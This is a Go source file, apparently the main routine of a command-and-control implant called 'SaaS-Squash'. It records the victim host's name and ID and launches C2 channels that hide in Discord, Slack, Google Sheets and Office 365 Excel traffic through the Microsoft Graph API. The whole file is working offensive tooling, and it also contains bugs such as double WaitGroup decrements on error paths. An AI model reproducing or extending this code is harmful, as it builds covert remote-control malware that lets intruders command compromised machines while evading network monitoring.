package main

import (
	"SaaS-Squash/common"
	discordbot "SaaS-Squash/discord"
	googlesheets "SaaS-Squash/google/sheets"
	o365excel "SaaS-Squash/o365/excel"
	"SaaS-Squash/slack"
	"net/http"
	"sync"
)

var (
	wg sync.WaitGroup
)

func main() {
	//generate Host ID
	common.AllC2Configs.UUID.HostName = common.GetHostName()
	common.AllC2Configs.UUID.HostID = common.GetHostID()

	wg.Add(1)
	if common.AllC2Configs.MultiApp.Enable {
		common.AllC2Configs.Debug.LogDebug("MultiApp enabled.")
		if common.AllC2Configs.Discord.Enable {
			wg.Add(1)
			go discordStart()
		}
		if common.AllC2Configs.Google.Enable {
			wg.Add(1)
			go googleStart()
		}
		if common.AllC2Configs.O365.Enable {
			wg.Add(1)
			go o365Start()
		}
		if common.AllC2Configs.Slack.Enable {
			wg.Add(1)
			go slackStart()
		}
		wg.Wait()
		// Keep the main function running

	} else {
		common.AllC2Configs.Debug.LogDebug("MultiApp disabled.")
		if common.AllC2Configs.Discord.Enable {
			discordStart()
		}
		if common.AllC2Configs.Google.Enable {
			googleStart()
		}
		if common.AllC2Configs.O365.Enable {
			o365Start()
		}
		if common.AllC2Configs.Slack.Enable {
			slackStart()
		}
		select {}
	}

}

func discordStart() {

	// Try to establish a connection with the Discord app
	err := discordbot.Start()
	if err != nil {
		wg.Done()
		common.AllC2Configs.Debug.LogDebugError("Error starting Discord bot: ", err)
	} else {
		common.AllC2Configs.Debug.LogDebug("Discord bot is running.")
	}
	wg.Done()
}

func slackStart() {

	// Try to establish a connection with the Discord app
	if common.AllC2Configs.Slack.LegacyRTMMode {
		slack.StartRTM()
		common.AllC2Configs.Debug.LogDebug("Slack bot is running (RTM).")
	} else {
		slack.StartSocket()
		common.AllC2Configs.Debug.LogDebug("Slack bot is running.")
	}
	wg.Done()
}

func googleStart() {
	// Try to establish a connection with Google Sheets
	if common.AllC2Configs.Google.Enable {
		err := googlesheets.Run()
		if err != nil {
			wg.Done()
			common.AllC2Configs.Debug.LogDebugError("Error starting Google Sheets C2: ", err)
		} else {
			common.AllC2Configs.Debug.LogDebug("Google Sheets C2 is running.")
		}
	} else {
		common.AllC2Configs.Debug.LogDebug("Google Sheets C2 is not enabled.")
	}
	wg.Done()
}

func o365Start() {

	// Create excelClient
	excelClient := new(o365excel.ExcelClient)

	// Try to establish a connection with O365 Excel
	if common.AllC2Configs.O365.Enable {
		//HTTP Fields
		excelClient.UserAgent = "GoLang Client"
		excelClient.HttpClient = new(http.Client)
		excelClient.BaseURL = "https://graph.microsoft.com/v1.0/users/" + common.AllC2Configs.O365.UserId + "/drive/root:/" + common.AllC2Configs.O365.FileName

		// Find the drive/sheet IDs
		o365excel.UpdateSheetMeta(excelClient)

		// Update the BaseURL with drive/sheet IDs
		excelClient.BaseURL = "https://graph.microsoft.com/v1.0/drives/" + excelClient.DriveId + "/items/" + excelClient.SheetId + "/workbook/worksheets"
		err := o365excel.Run(excelClient)
		if err != nil {
			wg.Done()
			common.AllC2Configs.Debug.LogDebugError("Error starting O365 Excel C2: ", err)
		} else {
			common.AllC2Configs.Debug.LogDebug("O365 Excel C2 is running.")
		}
	} else {
		common.AllC2Configs.Debug.LogDebug("O365 Excel C2 is not enabled.")
	}
	wg.Done()
}
